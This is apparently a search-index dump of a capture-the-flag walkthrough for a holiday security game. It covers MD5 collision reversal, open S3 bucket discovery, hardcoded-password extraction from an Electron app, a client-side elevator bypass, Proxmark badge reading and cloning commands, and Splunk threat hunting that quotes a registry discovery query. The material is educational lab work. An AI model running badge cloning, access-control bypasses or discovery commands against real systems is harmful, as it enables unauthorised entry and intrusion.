(255) , which is defined as 255:'Binary blob' in naughty_nice.py . Examining the attachment shows that it appears to be completely random data. From the CollTris presentation , we know that in a UNICOLL collision, the 10th character in the prefix block is incremented by 1, while the 10th character in the next block is decremented by 1. In the Naughty/Nice blockchain, the 10th character in the second block of 64 bytes is the sign , which determines whether the score is naughty (0) or nice (1) . Jack was able to change the sign from 0 -> 1 , also changing the 10th byte in the next 64-byte segment, in the binary blob of 'random' data. Reversing those changes with a hex editor allows us to fix Jack's score, while the MD5 hash of the block remains unchanged. The second set of changed bytes is in the attached PDF. Viewing the PDF shows almost identical statements from various people, all attesting that Jack Frost is the most wonderful person on the planet. Shinny Upatree, however, swears that this isn't what he wrote for the event. We can use a tool like pdf2txt to extract all of the text from the PDF and see what is hidden: Hidden in the PDF is the actual text Shinny wrote, where we see that Jack had access to the report and blockchain submission system. Using a tool that creates collisions in PDF files , Jack was able to hide his fake report inside the one submitted 1 . We can reverse this by reversing the results of the tool with a hex editor on the block: by incrementing Pages 2 and decrementing the corresponding byte in the next block. diff shows the changes between the original and 'good' block, while the MD5 remains the same. The SHA256 hashes, however, are different: The SHA256 hash of the 'good' block is fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb . Answer # fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb I may have used this technique on this PDF as well... \u21a9","title":"Naughty/Nice List with Blockchain Investigation Part 2"},{"location":"objectives/11b/#objective-11b-naughtynice-list-with-blockchain-investigation-part-2","text":"The SHA256 of Jack's altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you've recreated the original block, what is the SHA256 of that block? Difficulty: 5/5","title":"Objective 11b: Naughty/Nice List with Blockchain Investigation Part 2"},{"location":"objectives/11b/#solution","text":"But we in it shall be remembered-we few, we happy few, we band of brothers; for he today that finishes 11b with me shall be my brother, be he ne'er so vile... 11b. The premise was simple: find the block that contains the data on Jack, change 4 bytes in it to display the original data, all while the MD5 hash of the block remained unchanged. We're given some hints: Jack used a type of hash collision called UNICOLL . Jack's score was originally overwhelmingly negative and is now overwhelmingly positive. And, Shinny Upatree swears he didn't write the PDF document attached to Jack's block. Finding the block isn't difficult: creating a list of scores of the blocks in the chain shows one block with a score of ffffffff (4294967295) , which matches what we learned from Tinsel Upatree about Jack's score. The block in question also has two documents, one of which is a very large PDF attachment. Dumping the block and the individual attachments shows that the block matches the SHA256 hash in the objective, so we know we've identified the block with Jack's data. Now that we've identified the block, let's take a look at the data in the block. We can understand the data format of the block from the Python code: def load_a_block ( self , fh ): self . index = int ( fh . read ( 16 ), 16 ) self . nonce = int ( fh . read ( 16 ), 16 ) self . pid = int ( fh . read ( 16 ), 16 ) self . rid = int ( fh . read ( 16 ), 16 ) self . doc_count = int ( fh . read ( 1 ), 10 ) self . score = int ( fh . read ( 8 ), 16 ) self . sign = int ( fh . read ( 1 ), 10 ) count = self . doc_count while ( count > 0 ): l_data = {} l_data [ 'type' ] = int ( fh . read ( 2 ), 16 ) l_data [ 'length' ] = int ( fh . read ( 8 ), 16 ) l_data [ 'data' ] = fh . read ( l_data [ 'length' ]) self . data . append ( l_data ) count -= 1 We can take a look at the block with xxd : Starting at byte 0x40 (64) , we can decode the block this way: doc_count = 2 score = ffffffff sign = 1 The next set of bytes are the attached documents. The first is of type 0xff (255) , which is defined as 255:'Binary blob' in naughty_nice.py . Examining the attachment shows that it appears to be completely random data. From the CollTris presentation , we know that in a UNICOLL collision, the 10th character in the prefix block is incremented by 1, while the 10th character in the next block is decremented by 1. In the Naughty/Nice blockchain, the 10th character in the second block of 64 bytes is the sign , which determines whether the score is naughty (0) or nice (1) . Jack was able to change the sign from 0 -> 1 , also changing the 10th byte in the next 64-byte segment, in the binary blob of 'random' data. Reversing those changes with a hex editor allows us to fix Jack's score, while the MD5 hash of the block remains unchanged. The second set of changed bytes is in the attached PDF. Viewing the PDF shows almost identical statements from various people, all attesting that Jack Frost is the most wonderful person on the planet. Shinny Upatree, however, swears that this isn't what he wrote for the event. We can use a tool like pdf2txt to extract all of the text from the PDF and see what is hidden: Hidden in the PDF is the actual text Shinny wrote, where we see that Jack had access to the report and blockchain submission system. Using a tool that creates collisions in PDF files , Jack was able to hide his fake report inside the one submitted 1 . We can reverse this by reversing the results of the tool with a hex editor on the block: by incrementing Pages 2 and decrementing the corresponding byte in the next block. diff shows the changes between the original and 'good' block, while the MD5 remains the same. The SHA256 hashes, however, are different: The SHA256 hash of the 'good' block is fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb .","title":"Solution"},{"location":"objectives/11b/#answer","text":"fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb I may have used this technique on this PDF as well... \u21a9","title":"Answer"},{"location":"objectives/2/","text":"Investigate S3 Bucket # This objective involves two distinct parts: finding a unpotected S3 storage bucket, then determining the content of the bucket. Objective # When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge. Difficulty: 1/5 Shinny Upatree's dialog # Hiya hiya - I'm Shinny Upatree! Check out this cool KringleCon kiosk! You can get a map of the castle, learn about where the elves are, and get your own badge printed right on-screen! Be careful with that last one though. I heard someone say it's \"ingestible.\" Or something... Do you think you could check and see if there is an issue? Hints # It seems like there's a new story every week about data exposed through unprotected Amazon S3 buckets . Robin Wood wrote up a guide about finding these open S3 buckets . He even wrote a tool to search for unprotected buckets ! Find Santa's package file from the cloud storage provider. Check Josh Wright's talk for more tips! Santa's Wrapper3000 is pretty buggy. It uses several compression tools, binary to ASCII conversion, and other tools to wrap packages. Solution # To find the unprotected S3 bucket, we'll use the tool bucket_finder installed on the terminal labeled Investigate S3 Bucket . There is a sample wordlist included in the bucket_finder directory: Unfortunately, running bucket_finder -d wordlist doesn't find the relevant data, so we'll need do some guesswork on what the bucket we're looking for will be named. We try a few guesses, based on the hints and dialog: And have some success: The -d flag passed to bucket_finder specifies that we want any content in the bucket downloaded locally. We see it downloaded the file package from http://s3.amazonaws.com/wrapper3000 . Let's see what's in it: It's base64-encoded data. We can decode it with base64 -d package > package-1 . Running file package-1 shows that it's a .ZIP file. Checking the content of the ZIP file reveals a very strangely named file: From the list of extensions on the file, we'll need to use the following utilities to extract the file: 1. bunzip2 2. tar 3. xxd 4. unxz 5. uncompress xxd may not be familiar to some users. It's a tool for displaying files as hexdump, or re-creating a binary file from a hexdump: We use xxd -r to re-create the .xz file, and proceed to extract the final package.txt and see it's contents for the objective: Answer # North Pole: The Frostiest Place on Earth","title":"Investigate S3 Bucket"},{"location":"objectives/2/#investigate-s3-bucket","text":"This objective involves two distinct parts: finding a unpotected S3 storage bucket, then determining the content of the bucket.","title":"Investigate S3 Bucket"},{"location":"objectives/2/#objective","text":"When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge. Difficulty: 1/5","title":"Objective"},{"location":"objectives/2/#shinny-upatrees-dialog","text":"Hiya hiya - I'm Shinny Upatree! Check out this cool KringleCon kiosk! You can get a map of the castle, learn about where the elves are, and get your own badge printed right on-screen! Be careful with that last one though. I heard someone say it's \"ingestible.\" Or something... Do you think you could check and see if there is an issue?","title":"Shinny Upatree's dialog"},{"location":"objectives/2/#hints","text":"It seems like there's a new story every week about data exposed through unprotected Amazon S3 buckets . Robin Wood wrote up a guide about finding these open S3 buckets . He even wrote a tool to search for unprotected buckets ! Find Santa's package file from the cloud storage provider. Check Josh Wright's talk for more tips! Santa's Wrapper3000 is pretty buggy. It uses several compression tools, binary to ASCII conversion, and other tools to wrap packages.","title":"Hints"},{"location":"objectives/2/#solution","text":"To find the unprotected S3 bucket, we'll use the tool bucket_finder installed on the terminal labeled Investigate S3 Bucket . There is a sample wordlist included in the bucket_finder directory: Unfortunately, running bucket_finder -d wordlist doesn't find the relevant data, so we'll need do some guesswork on what the bucket we're looking for will be named. We try a few guesses, based on the hints and dialog: And have some success: The -d flag passed to bucket_finder specifies that we want any content in the bucket downloaded locally. We see it downloaded the file package from http://s3.amazonaws.com/wrapper3000 . Let's see what's in it: It's base64-encoded data. We can decode it with base64 -d package > package-1 . Running file package-1 shows that it's a .ZIP file. Checking the content of the ZIP file reveals a very strangely named file: From the list of extensions on the file, we'll need to use the following utilities to extract the file: 1. bunzip2 2. tar 3. xxd 4. unxz 5. uncompress xxd may not be familiar to some users. It's a tool for displaying files as hexdump, or re-creating a binary file from a hexdump: We use xxd -r to re-create the .xz file, and proceed to extract the final package.txt and see it's contents for the objective:","title":"Solution"},{"location":"objectives/2/#answer","text":"North Pole: The Frostiest Place on Earth","title":"Answer"},{"location":"objectives/3/","text":"Point-of-Sale Password Recovery # In this objective, we'll be pulling apart an application to find a hardcoded password. To get the hints, complete the Linux Primer terminal first. Objective # Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password? Difficulty: 1/5 Sugarplum Mary's dialog: # Hey, wouldja' mind helping me get into my point-of-sale terminal? It's down, and we kinda' need it running. Problem is: it is asking for a password. I never set one! Can you help me figure out what it is so I can get set up? Shinny says this might be an Electron application. I hear there's a way to extract an ASAR file from the binary, but I haven't looked into it yet. Hints # It's possible to extract the source code from an Electron app. There are tools and guides explaining how to extract ASAR from Electron apps. Solution # Electron is a framework for developing native applications with web technologies such as JavaScript, HTML, and CSS. From the guide on medium, it's possible to extract the source code of the application. We'll use the guide as a basis to finding and viewing the source code to the Santa Shop application. Opening the Santa Shop terminal displays the following screen: We're presented with a link to download the application for offline analysis. Downloading the file and running the file command on it gives us some details on what type of application we're dealing with: The important piece of information file returned is Nullsoft Installer self-extracting archive . While we could transfer the executable to a Windows machine and run the installer, it's easier to use a tool like 7zip to just extract the installation files: This gives us the installer files, but unfortunately we don't yet have the .asar file that contains the application source. Looking in the $PLUGINSDIR directory, there is a app-64.7z file which looks promising. Let's create a directory to store it's contents, extract it with 7-zip , and use the find command to look for any .asar files: Aha, there is a file app.asar in the resources directory. From the guide, we need to use the asar utility from node.js to work with the file. After installing node.js and adding the asar command, we can run npx asar list command on app.asar to see a list of the application source code: npx asar extract {filename} {directory} is used to extract the source files from {filename} into {directory} . Extracting the source to a src directory and viewing the README.md tells us that the password is at the top of the file main.js : And there is Santa's password, in cleartext in the application source code. Answer # santapass","title":"Point-of-Sale Password Recovery"},{"location":"objectives/3/#point-of-sale-password-recovery","text":"In this objective, we'll be pulling apart an application to find a hardcoded password. To get the hints, complete the Linux Primer terminal first.","title":"Point-of-Sale Password Recovery"},{"location":"objectives/3/#objective","text":"Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password? Difficulty: 1/5","title":"Objective"},{"location":"objectives/3/#sugarplum-marys-dialog","text":"Hey, wouldja' mind helping me get into my point-of-sale terminal? It's down, and we kinda' need it running. Problem is: it is asking for a password. I never set one! Can you help me figure out what it is so I can get set up? Shinny says this might be an Electron application. I hear there's a way to extract an ASAR file from the binary, but I haven't looked into it yet.","title":"Sugarplum Mary's dialog:"},{"location":"objectives/3/#hints","text":"It's possible to extract the source code from an Electron app. There are tools and guides explaining how to extract ASAR from Electron apps.","title":"Hints"},{"location":"objectives/3/#solution","text":"Electron is a framework for developing native applications with web technologies such as JavaScript, HTML, and CSS. From the guide on medium, it's possible to extract the source code of the application. We'll use the guide as a basis to finding and viewing the source code to the Santa Shop application. Opening the Santa Shop terminal displays the following screen: We're presented with a link to download the application for offline analysis. Downloading the file and running the file command on it gives us some details on what type of application we're dealing with: The important piece of information file returned is Nullsoft Installer self-extracting archive . While we could transfer the executable to a Windows machine and run the installer, it's easier to use a tool like 7zip to just extract the installation files: This gives us the installer files, but unfortunately we don't yet have the .asar file that contains the application source. Looking in the $PLUGINSDIR directory, there is a app-64.7z file which looks promising. Let's create a directory to store it's contents, extract it with 7-zip , and use the find command to look for any .asar files: Aha, there is a file app.asar in the resources directory. From the guide, we need to use the asar utility from node.js to work with the file. After installing node.js and adding the asar command, we can run npx asar list command on app.asar to see a list of the application source code: npx asar extract {filename} {directory} is used to extract the source files from {filename} into {directory} . Extracting the source to a src directory and viewing the README.md tells us that the password is at the top of the file main.js : And there is Santa's password, in cleartext in the application source code.","title":"Solution"},{"location":"objectives/3/#answer","text":"santapass","title":"Answer"},{"location":"objectives/4/","text":"Operate the Santavator # Our next objective is to fix and operate the Santavator , an elevator that gives access to additional floors in Kringle Castle. Objective # Talk to Pepper Minstix in the entryway to get some hints about the Santavator. Difficulty: 2/5 Pepper Mintstix dialog: # There's a Santavator that moves visitors from floor to floor, but it's a bit wonky. You'll need a key and other odd objects. Try talking to Sparkle Redberry about the key. For the odd objects, maybe just wander around the castle and see what you find on the floor. Once you have a few, try using them to split, redirect, and color the Super Santavator Sparkle Stream (S4). You need to power the red, yellow, and green receivers with the right color light! Sparkle Redberry's dialog: # Hey hey, Sparkle Redberry here! The Santavator is on the fritz. Something with the wiring is grinchy, but maybe you can rig something up? Here's the key! Good luck! On another note, I heard Santa say that he was thinking of canceling KringleCon this year! At first, I thought it was a joke, but he seemed serious. I\u2019m glad he changed his mind. Have you had a chance to look at the Santavator yet? With that key, you can look under the panel and see the Super Santavator Sparkle Stream (S4). To get to different floors, you'll need to power the various colored receivers. ... There MAY be a way to bypass the S4 stream. Hints # It's really more art than science. The goal is to put the right colored light into the receivers on the left and top of the panel. Solution # In the top-right corner of the courtyard you'll find the elf Sparkle Redberry standing next to the Santavator , a magic-powered elevator. He'll give you a key to open the operator panel in the Santavator: Also, in your wanderings around the castle, you've probably seen and picked up some random items laying on the floor (a candycane in the entryway of the castle, for example). Those items will be behind the operator panel, which opens by clicking on the key: The legend in the bottom-right corner shows what color receiver needs to be \"powered\" for the button for that floor to be active. For example, powering the green receiver will allow access to the Lobby and the KringleCon Talks floors. The collected items can be dragged around to split, direct, and change the colors of the Sparkle Stream. For example, this configuration will power the green receiver: Closing the panel with the Sparkle Stream in that configuration now allows access to floor 2 (KringleCon talks): Visiting any floor other than the Lobby will fulfill the objective. Eventually more objects can be found around the castle, and with much creative moving of objects, all the receiver can be powered: There is a simpler way, that doesn't involve any objects, splitting Sparkle streams, and powered receiver. The answer lies in the source code to the Santavator application, and why client-side security checks can be a bad idea. The application that controlls the Santavator is an embedded iframe in the browser window. The application source is at https://elevator.kringlecastle.com/app.js . Of interest are the following blocks of JavaScript: 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 const handleBtn = event => { const targetFloor = event . currentTarget . attributes [ 'data-floor' ]. value ; $ . ajax ({ type : 'POST' , url : POST_URL , dataType : 'json' , contentType : 'application/json' , data : JSON . stringify ({ targetFloor , id : getParams . id , }), success : ( res , status ) => { if ( res . hash ) { __POST_RESULTS__ ({ resourceId : getParams . id || '1111' , hash : res . hash , action : `goToFloor- ${ targetFloor } ` , }); } } }); } 383 384 385 386 387 388 389 390 391 392 393 const btn1 = document . querySelector ( 'button[data-floor=\"1\"]' ); const btn2 = document . querySelector ( 'button[data-floor=\"1.5\"]' ); const btn3 = document . querySelector ( 'button[data-floor=\"2\"]' ); const btn4 = document . querySelector ( 'button[data-floor=\"3\"]' ); const btnr = document . querySelector ( 'button[data-floor=\"r\"]' ); btn1 . addEventListener ( 'click' , handleBtn ); btn2 . addEventListener ( 'click' , handleBtn ); btn3 . addEventListener ( 'click' , handleBtn ); btn4 . addEventListener ( 'click' , handleBtn4 ); btnr . addEventListener ( 'click' , handleBtn ); The handleBtn function is called when any of the buttons are clicked on, with the appropriate floor data (ignoring handleBtn4 for now). We can simulate a click on the button in the browser's JavaScript console using btnX.click() . Open the browsers Developer Tools menu and go to the Console tab ( Google Chrome shown): Because the Santavator code is an iFrame, it runs in a separate JavaScrpt context from the main page. In Chrome, that context can be selected via the dropdown menu at the top-left of the tools: Switch the context to elevator.kringlecastle.com , and enter btnX.click(); at the > prompt. You'll be taken to the floor associated with the button. Answer # Visit any floor other than the Lobby to fulfill this objective.","title":"Operate the Santavator"},{"location":"objectives/4/#operate-the-santavator","text":"Our next objective is to fix and operate the Santavator , an elevator that gives access to additional floors in Kringle Castle.","title":"Operate the Santavator"},{"location":"objectives/4/#objective","text":"Talk to Pepper Minstix in the entryway to get some hints about the Santavator. Difficulty: 2/5","title":"Objective"},{"location":"objectives/4/#pepper-mintstix-dialog","text":"There's a Santavator that moves visitors from floor to floor, but it's a bit wonky. You'll need a key and other odd objects. Try talking to Sparkle Redberry about the key. For the odd objects, maybe just wander around the castle and see what you find on the floor. Once you have a few, try using them to split, redirect, and color the Super Santavator Sparkle Stream (S4). You need to power the red, yellow, and green receivers with the right color light!","title":"Pepper Mintstix dialog:"},{"location":"objectives/4/#sparkle-redberrys-dialog","text":"Hey hey, Sparkle Redberry here! The Santavator is on the fritz. Something with the wiring is grinchy, but maybe you can rig something up? Here's the key! Good luck! On another note, I heard Santa say that he was thinking of canceling KringleCon this year! At first, I thought it was a joke, but he seemed serious. I\u2019m glad he changed his mind. Have you had a chance to look at the Santavator yet? With that key, you can look under the panel and see the Super Santavator Sparkle Stream (S4). To get to different floors, you'll need to power the various colored receivers. ... There MAY be a way to bypass the S4 stream.","title":"Sparkle Redberry's dialog:"},{"location":"objectives/4/#hints","text":"It's really more art than science. The goal is to put the right colored light into the receivers on the left and top of the panel.","title":"Hints"},{"location":"objectives/4/#solution","text":"In the top-right corner of the courtyard you'll find the elf Sparkle Redberry standing next to the Santavator , a magic-powered elevator. He'll give you a key to open the operator panel in the Santavator: Also, in your wanderings around the castle, you've probably seen and picked up some random items laying on the floor (a candycane in the entryway of the castle, for example). Those items will be behind the operator panel, which opens by clicking on the key: The legend in the bottom-right corner shows what color receiver needs to be \"powered\" for the button for that floor to be active. For example, powering the green receiver will allow access to the Lobby and the KringleCon Talks floors. The collected items can be dragged around to split, direct, and change the colors of the Sparkle Stream. For example, this configuration will power the green receiver: Closing the panel with the Sparkle Stream in that configuration now allows access to floor 2 (KringleCon talks): Visiting any floor other than the Lobby will fulfill the objective. Eventually more objects can be found around the castle, and with much creative moving of objects, all the receiver can be powered: There is a simpler way, that doesn't involve any objects, splitting Sparkle streams, and powered receiver. The answer lies in the source code to the Santavator application, and why client-side security checks can be a bad idea. The application that controlls the Santavator is an embedded iframe in the browser window. The application source is at https://elevator.kringlecastle.com/app.js . Of interest are the following blocks of JavaScript: 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 const handleBtn = event => { const targetFloor = event . currentTarget . attributes [ 'data-floor' ]. value ; $ . ajax ({ type : 'POST' , url : POST_URL , dataType : 'json' , contentType : 'application/json' , data : JSON . stringify ({ targetFloor , id : getParams . id , }), success : ( res , status ) => { if ( res . hash ) { __POST_RESULTS__ ({ resourceId : getParams . id || '1111' , hash : res . hash , action : `goToFloor- ${ targetFloor } ` , }); } } }); } 383 384 385 386 387 388 389 390 391 392 393 const btn1 = document . querySelector ( 'button[data-floor=\"1\"]' ); const btn2 = document . querySelector ( 'button[data-floor=\"1.5\"]' ); const btn3 = document . querySelector ( 'button[data-floor=\"2\"]' ); const btn4 = document . querySelector ( 'button[data-floor=\"3\"]' ); const btnr = document . querySelector ( 'button[data-floor=\"r\"]' ); btn1 . addEventListener ( 'click' , handleBtn ); btn2 . addEventListener ( 'click' , handleBtn ); btn3 . addEventListener ( 'click' , handleBtn ); btn4 . addEventListener ( 'click' , handleBtn4 ); btnr . addEventListener ( 'click' , handleBtn ); The handleBtn function is called when any of the buttons are clicked on, with the appropriate floor data (ignoring handleBtn4 for now). We can simulate a click on the button in the browser's JavaScript console using btnX.click() . Open the browsers Developer Tools menu and go to the Console tab ( Google Chrome shown): Because the Santavator code is an iFrame, it runs in a separate JavaScrpt context from the main page. In Chrome, that context can be selected via the dropdown menu at the top-left of the tools: Switch the context to elevator.kringlecastle.com , and enter btnX.click(); at the > prompt. You'll be taken to the floor associated with the button.","title":"Solution"},{"location":"objectives/4/#answer","text":"Visit any floor other than the Lobby to fulfill this objective.","title":"Answer"},{"location":"objectives/5/","text":"Open HID lock # We're able to go to the different floors in the castle now, but there's a door we can't access: the locked door in the Workshop . Objective # Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips. Difficulty: 2/5 Bushy Evergreen's dialog: # Oh, this might be a good time to mention another lock in the castle. Santa asked me to ask you to evaluate the security of our new HID lock. If ever you find yourself in posession of a Proxmark3, click it in your badge to interact with it. It's a slick device that can read others' badges! Oh, did I mention that the Proxmark can simulate badges? Cool, huh? There are lots of references online to help. In fact, there's a talk going on right now! And that Proxmark thing? Some people scan other people's badges and try those codes at locked doors. Other people scan one or two and just try to vary room numbers. Do whatever works best for you! Fizzy Shortstack's dialog: # You know, Santa really seems to trust Shinny Upatree... Hints # The Proxmark is a multi-function RFID device, capable of capturing and replaying RFID events. Larry Pesce knows a thing or two about HID attacks . He's the author of a course on wireless hacking! There's a short list of essential Proxmark commands also available. You can also use a Proxmark to impersonate a badge to unlock a door, if the badge you impersonate has access. lf hid sim -r 2006...... You can use a Proxmark to capture the facility code and ID value of HID ProxCard badge by running lf hid read when you are close enough to someone with a badge. Solution # Note To get the full dialog from Bushy, we'll need to complete the Speaker UNPrep terminal next to him. Additionally, by completing Fizzy Shortstack's modem task, we get a valuable clue to opening the door. Once we have access to the Workshop via the Santavator, in the wrapping room in the back on the floor is a Proxmark3 . A Proxmark3 is a device used by penetration to scan for, read, and replay RFID data. It's most common use in penetration tests is to read and spoof access badges/tags to enter secured areas. In this case, we're going to use it to become a trusted elf that has access to the locked room in the Workshop. From Fizzy Shortstack, we learn that Santa really trusts Shinny Upatree. He may trust him enough to allow him access to the locked room. A Proxmark reader only has a limited range, so it's essential to be close to the badge we're trying to read. After moving to the Courtyard, stand close to Shinny and bring up your item list in your badge: and then open the Proxmark console: A short list of essential Proxmark commands is here . We scan for any RFID devices in the local area by auto or lf hid read : We see that Shinny Shortstack's badge is TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025 . Using the TAG ID , we can now spoof Shinny's badge as if we were him. By standing next to the badge reader next to the locked door in the Workshop, we can use the lf hid sim command to simulate Shinny's badge: And that completes the objective. If we're curious, we could scan the other individuals in the castle to build a database of all the badges: Once the door opens, enter the locked room to open the remaining objectives. Answer # Simulate Shinny Upatree's badge to open the locked door","title":"Open HID Lock"},{"location":"objectives/5/#open-hid-lock","text":"We're able to go to the different floors in the castle now, but there's a door we can't access: the locked door in the Workshop .","title":"Open HID lock"},{"location":"objectives/5/#objective","text":"Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips. Difficulty: 2/5","title":"Objective"},{"location":"objectives/5/#bushy-evergreens-dialog","text":"Oh, this might be a good time to mention another lock in the castle. Santa asked me to ask you to evaluate the security of our new HID lock. If ever you find yourself in posession of a Proxmark3, click it in your badge to interact with it. It's a slick device that can read others' badges! Oh, did I mention that the Proxmark can simulate badges? Cool, huh? There are lots of references online to help. In fact, there's a talk going on right now! And that Proxmark thing? Some people scan other people's badges and try those codes at locked doors. Other people scan one or two and just try to vary room numbers. Do whatever works best for you!","title":"Bushy Evergreen's dialog:"},{"location":"objectives/5/#fizzy-shortstacks-dialog","text":"You know, Santa really seems to trust Shinny Upatree...","title":"Fizzy Shortstack's dialog:"},{"location":"objectives/5/#hints","text":"The Proxmark is a multi-function RFID device, capable of capturing and replaying RFID events. Larry Pesce knows a thing or two about HID attacks . He's the author of a course on wireless hacking! There's a short list of essential Proxmark commands also available. You can also use a Proxmark to impersonate a badge to unlock a door, if the badge you impersonate has access. lf hid sim -r 2006...... You can use a Proxmark to capture the facility code and ID value of HID ProxCard badge by running lf hid read when you are close enough to someone with a badge.","title":"Hints"},{"location":"objectives/5/#solution","text":"Note To get the full dialog from Bushy, we'll need to complete the Speaker UNPrep terminal next to him. Additionally, by completing Fizzy Shortstack's modem task, we get a valuable clue to opening the door. Once we have access to the Workshop via the Santavator, in the wrapping room in the back on the floor is a Proxmark3 . A Proxmark3 is a device used by penetration to scan for, read, and replay RFID data. It's most common use in penetration tests is to read and spoof access badges/tags to enter secured areas. In this case, we're going to use it to become a trusted elf that has access to the locked room in the Workshop. From Fizzy Shortstack, we learn that Santa really trusts Shinny Upatree. He may trust him enough to allow him access to the locked room. A Proxmark reader only has a limited range, so it's essential to be close to the badge we're trying to read. After moving to the Courtyard, stand close to Shinny and bring up your item list in your badge: and then open the Proxmark console: A short list of essential Proxmark commands is here . We scan for any RFID devices in the local area by auto or lf hid read : We see that Shinny Shortstack's badge is TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025 . Using the TAG ID , we can now spoof Shinny's badge as if we were him. By standing next to the badge reader next to the locked door in the Workshop, we can use the lf hid sim command to simulate Shinny's badge: And that completes the objective. If we're curious, we could scan the other individuals in the castle to build a database of all the badges: Once the door opens, enter the locked room to open the remaining objectives.","title":"Solution"},{"location":"objectives/5/#answer","text":"Simulate Shinny Upatree's badge to open the locked door","title":"Answer"},{"location":"objectives/6/","text":"Splunk Challenge # Moving around the dark room behind the locked door, we see what look like peep holes in the wall. Walking to them, we discover we've been transformed into (or are controlling) Santa. Just what is going on here? Objective # Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon? Difficulty: 3/5 Angel Candysalt's dialog: # Hey Santa, there\u2019s some crazy stuff going on that we can see through our Splunk infrastructure. You better login and see what\u2019s up. Hints # There was a great Splunk talk at KringleCon 2 that's still available! Dave Herrald talks about emulating advanced adversaries and hunting them with Splunk . Defenders often need to manipulate data to decRypt, deCode, and refourm it into something that is useful. Cyber Chef is extremely useful here! Solution # In this objective, we're going to be using Splunk to find events and data related to a simulated attack against Santa's infrastructure. Some knowledge of Splunk or similar SIEM/logging platforms is useful for this task, but the videos in the Hints will give a good foundation to help with completing this objective. The KringleCastle SOC (Security Operations Center) has used a testing tool known as Atomic Red Team to perform a set of tactics and techniques that attackers use to penetrate systems. The MITRE corporation has developed a knowledge base of these tactics/techniques known as ATT&CK . Logging into the Splunk terminal as Santa, we see there's a chat room for the SOC analysts: And a private chat between Alice Bluebird (the KringleCastle SOC Team Lead) and Santa: We have a series of questions to answer before we can get to the final question for the objective: It's helpful to open an additional browser tab with the Splunk interface to run queries against, leaving the KringleCon SOC chat window open for access to the questions. Question 1: How many distinct MITRE ATT&CK techniques did Alice emulate? # To answer this, Alice gives us the basic part of the question: | tstats count where index=* by index , which yields these results: The 'Techniques' in the simulation are organized into individual Splunk indexes, named after the technique (ex. t0133 , t0157 , ...). A technique can have sub-techniques, such as t1059.003 and t1059.005 . The question calls for the number of top-level techniques, which counted up add to 13 . Answering the question gives us more dialog from Alice in the chat, including a Splunk query that returns the exact answer: | tstats count where index=* by index | search index=T*-win OR T*-main | rex field=index \"(?<technique>t\\d+)[\\.\\-].0*\" | stats dc(technique) Question 2: What are the names of the two indexes that contain the results of emulating Enterprise ATT&CK technique 1059.003? (Put them in alphabetical order and separate them with a space) # Using the screenshot above, we can see the two indexes is t1059.003-main t1059.003-win . Question 3: One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid? # For this question, we'l need to dig into the MITRE ATT&CK framework to determine which technique is being used, and therefore which Splunk index to search. MITRE has developed a tool to facilitate searching the framework for techniques, available here . Open that page in a new tab, click 'Create a new layer', and select 'Enterprise'. This brings up a browsable and searchable instance of ATT&CK. We can search for 'system information discovery' and get a link to the page related to that technique: Clicking on the 'view' link takes us to the specific page on the technique, which is T1082: Using that technique number as the index, we can then search Splunk for the keyword MachineGuid , to find where the simulated attack queried the regstry: The command line used to query the registry was REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid , which makes the key queried HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography . Question 4: According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.) # OSTap is a JavaScript-based downloader commonly used to deliver malware such as TrickBot. Alice gives a hint on what index to search: I suppose the SOC elves might overthink this one. Splunk Attack Range keeps track of the simulations that are run in index=attack You can then search that index for specific keywords... We can search Splunk for anything related OSTap it with index=attack ostap . We're looking for the UTC timestamp of the earliest technique, so scrolling down to the bottom of the ressults and expanding #8 gives us a timestamp of 2020-11-30T17:44:15Z Question 5: One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component? # This question requires a bit more research. We need to look at frngca's GitHub page to find what package the tool is using, so we can search Splunk for when it was used. Looking at their repositories, one jumps out: AudioDeviceCmdlets , used to control audio devices on Windows: So we're looking for something to do with audio devices. Going back to the ATT&CK navigator and searching for 'audio', we find Audio capture is technique T1123 . We can then go to the Atomic Red Team GitHub Repository to look at the specific tests run for T1123 in the file https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.yaml : attack_technique : T1123 display_name : Audio Capture atomic_tests : - name : using device audio capture commandlet auto_generated_guid : 9c3ad250-b185-4444-b5a9-d69218a10c95 description : | [AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet) supported_platforms : - windows executor : command : | powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet name : powershell Searching Splunk for index=t1123-win WindowsAudioDevice-Powershell-Cmdlet and scrolling to the bottom of the results yields this data: The ProcessId is 0xe40 , which when converted from hexadecimal to base 10 is 3648 . Question 6: Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch 